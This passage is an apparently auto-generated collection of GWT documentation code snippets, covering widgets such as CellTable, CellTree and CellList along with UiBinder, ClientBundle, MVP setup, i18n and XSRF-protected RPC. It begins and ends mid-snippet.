</java>\n</target>\n```\n\n----------------------------------------\n\nTITLE: Implementing onModuleLoad in a GWT MVP Application\nDESCRIPTION: This code shows the entry point of a GWT application using MVP architecture. It creates the RPC service, EventBus, and AppController, which takes control of the application flow. The AppController is responsible for creating presenters and supplying views.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class Contacts implements EntryPoint {\n\n  public void onModuleLoad() {\n    ContactsServiceAsync rpcService = GWT.create(ContactsService.class);\n    EventBus eventBus = new SimpleEventBus();\n    AppController appViewer = new AppController(rpcService, eventBus);\n    appViewer.go(RootPanel.get());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing CellTable in GWT\nDESCRIPTION: Example showing how to create a CellTable widget with contact information display. Demonstrates creation of columns, data population, and basic table setup. Uses TextColumn for name and address fields.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of {@link CellTable} of contacts having a name and address.\n */\npublic class CellTableExample implements EntryPoint {\n\n  // A simple data type that represents a contact.\n  private static class Contact {\n    private final String address;\n    private final String name;\n\n    public Contact(String name, String address) {\n      this.name = name;\n      this.address = address;\n    }\n  }\n\n  // The list of data to display.\n  private static List<Contact> CONTACTS = Arrays.asList(\n    new Contact(\"John\", \"123 Fourth Road\"),\n    new Contact(\"Mary\", \"222 Lancer Lane\"));\n\n  public void onModuleLoad() {\n\n    // Create a CellTable.\n    CellTable<Contact> table = new CellTable<Contact>();\n\n    // Create name column.\n    TextColumn<Contact> nameColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.name;\n      }\n    };\n\n    // Create address column.\n    TextColumn<Contact> addressColumn = new TextColumn<Contact>() {\n      @Override\n      public String getValue(Contact contact) {\n        return contact.address;\n      }\n    };\n\n    // Add the columns.\n    table.addColumn(nameColumn, \"Name\");\n    table.addColumn(addressColumn, \"Address\");\n\n    // Set the total row count. This isn't strictly necessary, but it affects\n    // paging calculations, so its good habit to keep the row count up to date.\n    table.setRowCount(CONTACTS.size(), true);\n\n    // Push the data into the widget.\n    table.setRowData(0, CONTACTS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(table);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple JavaScript Alert Dialog with JSNI in Java\nDESCRIPTION: This snippet demonstrates how to create a JSNI method that displays a JavaScript alert dialog. Note the use of $wnd instead of window to reference the browser's window object when running in a nested frame.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic static native void alert(String msg) /*-{\n  $wnd.alert(msg);\n}-*/;\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Methods with Categories in GWT AutoBean\nDESCRIPTION: Demonstrates how to use categories to implement custom methods in AutoBean interfaces. This example shows a Person interface with a marry method implemented in a PersonCategory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\ninterface Person {\n  String getName();\n  void setName(String name);\n  boolean marry(Person spouse);\n}\n\n@Category(PersonCategory.class)\ninterface MyFactory {\n  // Would be illegal without a category providing an implementation of marry(AutoBean<Person> person, Person spouse)\n  AutoBean<Person> person();\n}\n\nclass PersonCategory {\n  public static boolean marry(AutoBean<Person> instance, Person spouse) {\n    return new Marriage(instance.as(), spouse).accepted();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Serializable Interface in StockPrice Class for GWT RPC\nDESCRIPTION: This snippet demonstrates how to make a Java class serializable for GWT RPC by implementing the Serializable interface. The StockPrice class contains primitive fields for stock symbol, price, and change values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\nimport java.io.Serializable;\n\npublic class StockPrice implements Serializable {\n\n  private String symbol;\n  private double price;\n  private double change;\n\n  ...\n\n```\n\n----------------------------------------\n\nTITLE: Using External Resources in UiBinder Templates\nDESCRIPTION: Demonstrates how to use external resources like images and styles in a UiBinder template using the <ui:with> element. Shows integration with ClientBundle for resource management.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_23\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n    xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n  <ui:with field='res' type='com.my.app.widgets.logoname.Resources'/>\n\n  <g:HTMLPanel>\n\n    <g:Image resource='{res.logo}'/>\n\n    <div class='{res.style.mainBlock}'>\n      <div class='{res.style.userPictureSprite}'/>\n\n      <div>\n        Well hello there\n        <span class='{res.style.nameSpan}' ui:field='nameSpan'/>\n      </div>\n    </div>\n\n  </g:HTMLPanel>\n</ui:UiBinder>\n```\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Resources used by the entire application.\n */\npublic interface Resources extends ClientBundle {\n  @Source(\"Style.css\")\n  Style style();\n\n  @Source(\"Logo.jpg\")\n  ImageResource logo();\n\n  public interface Style extends CssResource {\n    String mainBlock();\n    String nameSpan();\n    Sprite userPictureSprite();\n  }\n}\n```\n\nLANGUAGE: java\nCODE:\n```\n// Within the owner class for the UiBinder template\n@UiField Resources res;\n\n...\n\nres.style().ensureInjected();\n```\n\n----------------------------------------\n\nTITLE: Implementing Item Component Java Class in GWT\nDESCRIPTION: Java class for the Item UI component that also serves as a POJO for item data. It handles checkbox state changes and provides getters and setters for item properties.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.shared.GWT;\nimport com.google.gwt.dom.client.Element;\nimport com.google.gwt.uibinder.client.UiBinder;\nimport com.google.gwt.uibinder.client.UiField;\nimport com.google.gwt.uibinder.client.UiHandler;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.HTMLPanel;\nimport com.vaadin.polymer.iron.widget.event.IronChangeEvent;\nimport com.vaadin.polymer.paper.widget.PaperCheckbox;\n\npublic class Item extends Composite {\n\n  interface ItemUiBinder extends UiBinder<HTMLPanel, Item> {\n  }\n\n  private static ItemUiBinder ourUiBinder = GWT.create(ItemUiBinder.class);\n\n  @UiField Element title;\n  @UiField Element description;\n  @UiField PaperCheckbox done;\n\n  public Item() {\n    initWidget(ourUiBinder.createAndBindUi(this));\n  }\n\n  @UiHandler(\"done\")\n  protected void change(IronChangeEvent ev) {\n    if (done.getActive()) {\n      title.addClassName(\"done\");\n    } else {\n      title.removeClassName(\"done\");\n    }\n  }\n  public String getTitle() {\n    return title.getInnerText();\n  }\n  public void setTitle(String s) {\n    title.setInnerText(s);\n  }\n  public String getDescription() {\n    return description.getInnerText();\n  }\n  public void setDescription(String s) {\n    description.setInnerText(s);\n  }\n  public boolean isDone() {\n    return done.getActive();\n  }\n  public void setDone(boolean b) {\n    done.setActive(b);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Basic ClientBundle Resources for CSS and Images in GWT\nDESCRIPTION: Sets up a ClientBundle interface that provides access to both an ImageResource and a CssResource. This is the foundation for implementing sprites in GWT applications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_43\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends ClientBundle {\n  @Source(\"image.png\")\n  ImageResource image();\n\n  @Source(\"my.css\");\n  CssResource css();\n}\n```\n\n----------------------------------------\n\nTITLE: Using UiBinder-generated UI in Java\nDESCRIPTION: Demonstrates how to instantiate and use a UiBinder-generated UI class in Java code, including adding it to the DOM and interacting with its elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nHelloWorld helloWorld = new HelloWorld();\n// Don't forget, this is DOM only; will not work with GWT widgets\nDocument.get().getBody().appendChild(helloWorld.getElement());\nhelloWorld.setName(\"World\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom ColorCell for GWT Cell Widgets in Java\nDESCRIPTION: A complete example showing how to create a custom Cell implementation called ColorCell that extends AbstractCell<String> to render colored text. The example includes SafeHtml templates for secure rendering, proper null checking, and integration with a CellList widget.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCustomCells.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of creating a custom {@link Cell}.\n */\npublic class CellExample implements EntryPoint {\n\n  /**\n   * A custom {@link Cell} used to render a string that contains the name of a\n   * color.\n   */\n  static class ColorCell extends AbstractCell<String> {\n\n    /**\n     * The HTML templates used to render the cell.\n     */\n    interface Templates extends SafeHtmlTemplates {\n      /**\n       * The template for this Cell, which includes styles and a value.\n       * \n       * @param styles the styles to include in the style attribute of the div\n       * @param value the safe value. Since the value type is {@link SafeHtml},\n       *          it will not be escaped before including it in the template.\n       *          Alternatively, you could make the value type String, in which\n       *          case the value would be escaped.\n       * @return a {@link SafeHtml} instance\n       */\n      @SafeHtmlTemplates.Template(\"<div style=\\\"{0}\\\">{1}</div>\")\n      SafeHtml cell(SafeStyles styles, SafeHtml value);\n    }\n\n    /**\n     * Create a singleton instance of the templates used to render the cell.\n     */\n    private static Templates templates = GWT.create(Templates.class);\n\n    @Override\n    public void render(Context context, String value, SafeHtmlBuilder sb) {\n      /*\n       * Always do a null check on the value. Cell widgets can pass null to\n       * cells if the underlying data contains a null, or if the data arrives\n       * out of order.\n       */\n      if (value == null) {\n        return;\n      }\n\n      // If the value comes from the user, we escape it to avoid XSS attacks.\n      SafeHtml safeValue = SafeHtmlUtils.fromString(value);\n\n      // Use the template to create the Cell's html.\n      SafeStyles styles = SafeStylesUtils.forTrustedColor(safeValue.asString());\n      SafeHtml rendered = templates.cell(styles, safeValue);\n      sb.append(rendered);\n    }\n  }\n\n  /**\n   * The list of data to display.\n   */\n  private static final List<String> COLORS = Arrays.asList(\"red\", \"green\", \"blue\", \"violet\",\n      \"black\", \"gray\");\n\n  @Override\n  public void onModuleLoad() {\n    // Create a cell to render each value.\n    ColorCell cell = new ColorCell();\n\n    // Use the cell in a CellList.\n    CellList<String> cellList = new CellList<String>(cell);\n\n    // Push the data into the widget.\n    cellList.setRowData(0, COLORS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Making XSRF Protected RPC Calls\nDESCRIPTION: Java code demonstrating how to obtain and include XSRF token in RPC calls\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nXsrfTokenServiceAsync xsrf = (XsrfTokenServiceAsync)GWT.create(XsrfTokenService.class);\n((ServiceDefTarget)xsrf).setServiceEntryPoint(GWT.getModuleBaseURL() + \"xsrf\");\nxsrf.getNewXsrfToken(new AsyncCallback<XsrfToken>() {\n\n  public void onSuccess(XsrfToken token) {\n    MyServiceAsync rpc = (MyServiceAsync)GWT.create(MyService.class);\n    ((HasRpcToken) rpc).setRpcToken(token);\n\n    // make XSRF protected RPC call\n    rpc.doStuff(new AsyncCallback<Void>() {\n      // ...\n    });\n  }\n\n  public void onFailure(Throwable caught) {\n    try {\n      throw caught;\n    } catch (RpcTokenException e) {\n      // Can be thrown for several reasons:\n      //   - duplicate session cookie, which may be a sign of a cookie\n      //     overwrite attack\n      //   - XSRF token cannot be generated because session cookie isn't\n      //     present\n    } catch (Throwable e) {\n      // unexpected\n    }\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Sprite in CSS Using @sprite Rule\nDESCRIPTION: Demonstrates how to use the @sprite rule in CSS with the gwt-image property to reference an ImageResource. Elements matching the selector will display the image and automatically have their height and width set.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_44\n\nLANGUAGE: java\nCODE:\n```\n@sprite .myImage {\n  gwt-image: 'image';\n}\n```\n\n----------------------------------------\n\nTITLE: ClientFactory Interface for Dependency Management in GWT MVP\nDESCRIPTION: An interface defining a factory pattern to provide access to application-wide objects like EventBus, PlaceController, and view implementations, facilitating dependency management in GWT applications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic interface ClientFactory {\n    EventBus getEventBus();\n    PlaceController getPlaceController();\n    HelloView getHelloView();\n    GoodbyeView getGoodbyeView();\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Database from CellTable in GWT\nDESCRIPTION: This example shows how to use a FieldUpdater with a CellTable to handle user input and update the database. It creates a CellTable with a TextInputCell column and sets up a FieldUpdater to process changes to the contact names.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Example of using a {@link FieldUpdater} with a {@link CellTable}.\n */\npublic class CellTableFieldUpdaterExample implements EntryPoint {\n\n  /**\n   * A simple data type that represents a contact with a unique ID.\n   */\n  private static class Contact {\n    private static int nextId = 0;\n\n    private final int id;\n    private String name;\n\n    public Contact(String name) {\n      nextId++;\n      this.id = nextId;\n      this.name = name;\n    }\n  }\n\n  /**\n   * The list of data to display.\n   */\n  private static final List<Contact> CONTACTS = Arrays.asList(new Contact(\"John\"), new Contact(\n      \"Joe\"), new Contact(\"George\"));\n\n  /**\n   * The key provider that allows us to identify Contacts even if a field\n   * changes. We identify contacts by their unique ID.\n   */\n  private static final ProvidesKey<Contact> KEY_PROVIDER =\n      new ProvidesKey<CellTableFieldUpdaterExample.Contact>() {\n        @Override\n        public Object getKey(Contact item) {\n          return item.id;\n        }\n      };\n\n  @Override\n  public void onModuleLoad() {\n    // Create a CellTable with a key provider.\n    final CellTable<Contact> table = new CellTable<Contact>(KEY_PROVIDER);\n\n    // Add a text input column to edit the name.\n    final TextInputCell nameCell = new TextInputCell();\n    Column<Contact, String> nameColumn = new Column<Contact, String>(nameCell) {\n      @Override\n      public String getValue(Contact object) {\n        // Return the name as the value of this column.\n        return object.name;\n      }\n    };\n    table.addColumn(nameColumn, \"Name\");\n\n    // Add a field updater to be notified when the user enters a new name.\n    nameColumn.setFieldUpdater(new FieldUpdater<Contact, String>() {\n      @Override\n      public void update(int index, Contact object, String value) {\n        // Inform the user of the change.\n        Window.alert(\"You changed the name of \" + object.name + \" to \" + value);\n\n        // Push the changes into the Contact. At this point, you could send an\n        // asynchronous request to the server to update the database.\n        object.name = value;\n\n        // Redraw the table with the new data.\n        table.redraw();\n      }\n    });\n\n    // Push the data into the widget.\n    table.setRowData(CONTACTS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(table);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Timer for Auto-Refreshing Stock Data in GWT\nDESCRIPTION: Sets up a GWT Timer to automatically refresh the stock data at regular intervals. The timer calls the refreshWatchList method which updates the stock price and change fields for all tracked stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n\n  ...\n\n  // Move cursor focus to the input box.\n  newSymbolTextBox.setFocus(true);\n\n  // Setup timer to refresh list automatically.\n  Timer refreshTimer = new Timer() {\n    @Override\n    public void run() {\n      refreshWatchList();\n    }\n  };\n  refreshTimer.scheduleRepeating(REFRESH_INTERVAL);\n\n  ...\n\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Main Java Class Implementation for GWT-Polymer Todo App\nDESCRIPTION: The fully implemented Main class for the GWT-Polymer Todo application. It includes all UI field definitions, event handlers, and item management logic.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.GWT;\nimport com.google.gwt.event.dom.client.ClickEvent;\nimport com.google.gwt.uibinder.client.UiBinder;\nimport com.google.gwt.uibinder.client.UiField;\nimport com.google.gwt.uibinder.client.UiHandler;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.HTMLPanel;\nimport com.vaadin.polymer.paper.widget.PaperDialog;\nimport com.vaadin.polymer.paper.widget.PaperDrawerPanel;\nimport com.vaadin.polymer.paper.widget.PaperInput;\nimport com.vaadin.polymer.paper.widget.PaperTextarea;\n\npublic class Main extends Composite {\n  interface MainUiBinder extends UiBinder<HTMLPanel, Main> {\n  }\n\n  private static MainUiBinder ourUiBinder = GWT.create(MainUiBinder.class);\n\n  @UiField PaperDrawerPanel drawerPanel;\n  @UiField HTMLPanel content;\n\n  @UiField PaperDialog addItemDialog;\n  @UiField PaperInput titleInput;\n  @UiField PaperTextarea descriptionInput;\n\n  public Main() {\n    initWidget(ourUiBinder.createAndBindUi(this));\n  }\n\n  @UiHandler(\"addButton\")\n  protected void onAddButtonClick(ClickEvent e) {\n    addItemDialog.open();\n  }\n\n  @UiHandler(\"confirmAddButton\")\n  protected void onConfirmAddButtonClick(ClickEvent e) {\n    if (!titleInput.getValue().isEmpty()) {\n      addItem(titleInput.getValue(), descriptionInput.getValue());\n      // clear text fields\n      titleInput.setValue(\"\");\n      descriptionInput.setValue(\"\");\n    }\n  }\n\n  private void addItem(String title, String description) {\n\n\n```\n\n----------------------------------------\n\nTITLE: Using Arrays Utility Class in Java\nDESCRIPTION: The Arrays class provides static methods for manipulating arrays, including searching, sorting, comparing, and filling array data. It also offers methods for creating List views of arrays and parallel operations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\nArrays.sort(array);\nArrays.binarySearch(array, key);\nArrays.fill(array, val);\nArrays.equals(array1, array2);\nArrays.copyOf(original, newLength);\nArrays.asList(T...);\nArrays.parallelSort(array);\nArrays.stream(array);\n```\n\n----------------------------------------\n\nTITLE: Defining Plural Forms in GWT Messages Interface (Java)\nDESCRIPTION: Example of creating a Messages interface with plural forms using @DefaultMessage and @AlternateMessage annotations. It demonstrates how to handle different plural cases for item counts in a shopping cart.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n@DefaultLocale(\"en\") // not required since this is the default\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"There are {0,number} items in your cart.\")\n  @AlternateMessage({\"one\", \"There is 1 item in your cart.\"})\n  String cartItems(@PluralCount int itemCount);\n}\n```\n\n----------------------------------------\n\nTITLE: Handling HTML5 Storage Events in GWT\nDESCRIPTION: Demonstrates how to register and handle storage events, including accessing event details like old and new values, and updating UI components.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.storage.client.Storage;\nimport com.google.gwt.storage.client.StorageEvent;\nprivate Storage stockstore = null;\nstockStore = Storage.getLocalStorageIfSupported();\nif (stockStore != null) {\n  stockStore.addStorageEventHandler(new StorageEvent.Handler() {\n  public void onStorageChange(StorageEvent event) {\n    lastStockLabel.setText(\"Last Update: \"+event.getNewValue() +\": \" +event.getOldValue() +\": \" +event.getUrl());\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring App Engine Web Descriptor in XML\nDESCRIPTION: This XML snippet defines the App Engine web application descriptor (appengine-web.xml). It specifies the application ID and version number for deployment.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<appengine-web-app xmlns=\"http://appengine.google.com/ns/1.0\">\n  <application><!-- Your App Engine application ID goes here --></application>\n  <version>1</version>\n</appengine-web-app>\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT RPC Servlet in web.xml\nDESCRIPTION: XML configuration for mapping a GWT RPC service implementation to a URL pattern in the web.xml deployment descriptor. Shows how to register a servlet and its URL mapping.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Example servlet loaded into servlet container -->\n<servlet>\n  <servlet-name>myServiceImpl</servlet-name>\n  <servlet-class>\n    com.example.foo.server.MyServiceImpl\n  </servlet-class>\n</servlet>\n<servlet-mapping>\n  <servlet-name>myServiceImpl</servlet-name>\n  <url-pattern>/com.example.foo.Foo/myService</url-pattern>\n</servlet-mapping>\n```\n\n----------------------------------------\n\nTITLE: Implementing CellTree in GWT\nDESCRIPTION: Example demonstrating how to create a CellTree widget with hierarchical string data. Shows implementation of TreeViewModel interface and creation of node hierarchy.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of {@link CellTree}.  Shows a Tree consisting of strings.\n */\npublic class CellTreeExample implements EntryPoint {\n\n  // The model that defines the nodes in the tree.\n  private static class CustomTreeModel implements TreeViewModel {\n\n    // Get the NodeInfo that provides the children of the specified value.\n    public <T> NodeInfo<?> getNodeInfo(T value) {\n\n      // Create some data in a data provider. Use the parent value as a prefix for the next level.\n      ListDataProvider<String> dataProvider = new ListDataProvider<String>();\n      for (int i = 0; i < 2; i++) {\n        dataProvider.getList().add(value + \".\" + String.valueOf(i));\n      }\n\n      // Return a node info that pairs the data with a cell.\n      return new DefaultNodeInfo<String>(dataProvider, new TextCell());\n    }\n\n    // Check if the specified value represents a leaf node. Leaf nodes cannot be opened.\n    public boolean isLeaf(Object value) {\n      // The maximum length of a value is ten characters.\n      return value.toString().length() > 10;\n    }\n  }\n\n  public void onModuleLoad() {\n    // Create a model for the tree.\n    TreeViewModel model = new CustomTreeModel();\n\n    // Create the tree using the model. We specify the default value of the\n    // hidden root node as \"Item 1\".\n    CellTree tree = new CellTree(model, \"Item 1\");\n\n    // Add the tree to the root layout panel.\n    RootLayoutPanel.get().add(tree);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining UiBinder XML with Widgets\nDESCRIPTION: Shows a UiBinder XML template that incorporates GWT widgets. It demonstrates how to declare widget namespaces and use widgets within the template.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n    xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n  <g:HTMLPanel>\n    Hello, <g:ListBox ui:field='listBox' visibleItemCount='1'/>.\n  </g:HTMLPanel>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing XSRF Protected RPC Service Servlet\nDESCRIPTION: Java implementation of a server-side RPC service that extends XsrfProtectedServiceServlet for XSRF protection\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideSecurityRpcXsrf.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage com.example.foo.server;\n\nimport com.google.gwt.user.server.rpc.XsrfProtectedServiceServlet; \n\nimport com.example.client.MyService;\n\npublic class MyServiceImpl extends XsrfProtectedServiceServlet implements\n    MyService {\n\n  public String myMethod(String s) {\n    // Do something interesting with 's' here on the server.\n    return s;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Writing CSS for Selector Obfuscation in GWT\nDESCRIPTION: Shows the CSS side of selector obfuscation in GWT. Demonstrates how to define class names that will be accessible through the CssResource interface and automatically obfuscated at compile time.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_24\n\nLANGUAGE: css\nCODE:\n```\n    @sprite mySpriteClass mySpriteImage;\n    .someOtherClass {\n      /* ... */\n    }\n    .hookClass{} /* Empty and stripped, but left for future expansion */\n```\n\n----------------------------------------\n\nTITLE: Implementing AsyncDataProvider with CellList in GWT\nDESCRIPTION: This example shows how to use AsyncDataProvider to bind a CellList widget to an asynchronous data source. It implements onRangeChanged to fetch data based on the requested range and uses a timer to simulate an asynchronous call.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Entry point classes define <code>onModuleLoad()</code>.\n */\npublic class CellListExample implements EntryPoint {\n  // The list of data to display.\n  private static final List<String> DAYS = Arrays.asList(\"Sunday\", \"Monday\",\n      \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\");\n\n  public void onModuleLoad() {\n    // Create a cell to render each value in the list.\n    TextCell textCell = new TextCell();\n\n    // Create a CellList that uses the cell.\n    final CellList<String> cellList = new CellList<String>(textCell);\n\n    // Set the total row count. You might send an RPC request to determine the\n    // total row count.\n    cellList.setRowCount(DAYS.size(), true);\n\n    // Set the range to display. In this case, our visible range is smaller than\n    // the data set.\n    cellList.setVisibleRange(1, 3);\n\n    // Create a data provider.\n    AsyncDataProvider<String> dataProvider = new AsyncDataProvider<String>() {\n      @Override\n      protected void onRangeChanged(HasData<String> display) {\n        final Range range = display.getVisibleRange();\n\n        // This timer is here to illustrate the asynchronous nature of this data\n        // provider. In practice, you would use an asynchronous RPC call to\n        // request data in the specified range.\n        new Timer() {\n          @Override\n          public void run() {\n            int start = range.getStart();\n            int end = start + range.getLength();\n            List<String> dataInRange = DAYS.subList(start, end);\n\n            // Push the data back into the list.\n            cellList.setRowData(start, dataInRange);\n          }\n        }.schedule(2000);\n      }\n    };\n\n    // Connect the list to the data provider.\n    dataProvider.addDataDisplay(cellList);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Hello World Application in GWT\nDESCRIPTION: This snippet shows a complete Hello World application in GWT. It creates a button with a click handler that displays an alert when clicked. The code demonstrates how to create UI components, set up event handlers, and add elements to the RootPanel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsClient.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.hello.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.event.dom.client.ClickEvent;\nimport com.google.gwt.event.dom.client.ClickHandler;\nimport com.google.gwt.user.client.Window;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.google.gwt.user.client.ui.Widget;\n\n/**\n * Hello World application.\n */\npublic class Hello implements EntryPoint {\n\n  public void onModuleLoad() {\n    Button b = new Button(\"Click me\", new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        Window.alert(\"Hello, AJAX\");\n      }\n    });\n\n    RootPanel.get().add(b);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Async Service Calls with Error Handling in GWT\nDESCRIPTION: Implementation of various async service calls with error handling for login, stock operations, and data retrieval.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_31\n\nLANGUAGE: java\nCODE:\n```\nloginService.login(GWT.getHostPageBaseURL(), new AsyncCallback<LoginInfo>() {\n      public void onFailure(Throwable error) {\n        handleError(error);\n      }\n\n    ...\n\n    }\n\nstockService.getStocks(new AsyncCallback<String[]>() {\n      public void onFailure(Throwable error) {\n        handleError(error);\n      }\n\n    ...\n\n    });\n\nstockService.addStock(symbol, new AsyncCallback<Void>() {\n      public void onFailure(Throwable error) {\n        handleError(error);\n      }\n\n    ...\n\n    });\n\nstockService.removeStock(symbol, new AsyncCallback<Void>() {\n      public void onFailure(Throwable error) {\n        handleError(error);\n      }\n\n    ...\n\n    });\n```\n\n----------------------------------------\n\nTITLE: Implementing Layout Animation in GWT LayoutPanel\nDESCRIPTION: These Java code snippets demonstrate how to implement layout animation using LayoutPanel. It shows setting initial constraints, forcing layout, and then animating to new constraints over a specified duration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npanel.setWidgetTopHeight(child, 0, PX, 0, PX);\npanel.forceLayout();\n```\n\nLANGUAGE: java\nCODE:\n```\npanel.setWidgetTopHeight(child, 0, PX, 2, 